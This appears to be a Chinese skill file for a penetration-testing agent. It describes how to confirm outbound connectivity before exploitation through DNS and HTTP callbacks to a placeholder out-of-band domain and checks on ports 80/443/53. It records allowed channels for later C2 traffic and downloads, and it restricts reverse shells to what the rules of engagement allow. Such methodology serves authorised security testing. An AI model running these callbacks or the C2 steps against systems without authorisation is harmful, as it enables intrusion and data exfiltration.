---
name: payload-egress-confirm
description: 出网确认（payload 联通性证明）
triggers: ["出网", "反弹", "回连", "egress"]
---

# 出网确认

利用前先证明出网路径（避免盲发反弹）：
1. DNS：`nslookup <标记串>.<oob 域>`；HTTP：`curl http://<oob>/标记`——标记含资产与时间戳便于归因。
2. 常见放行端口探测：80/443/53 出站对照。
3. 结论 record_fact（允许的出站通道清单）——后续 C2/下载走允许通道。
- **反弹 shell 仅 RoE 显式允许**；默认到"出网证明"为止。
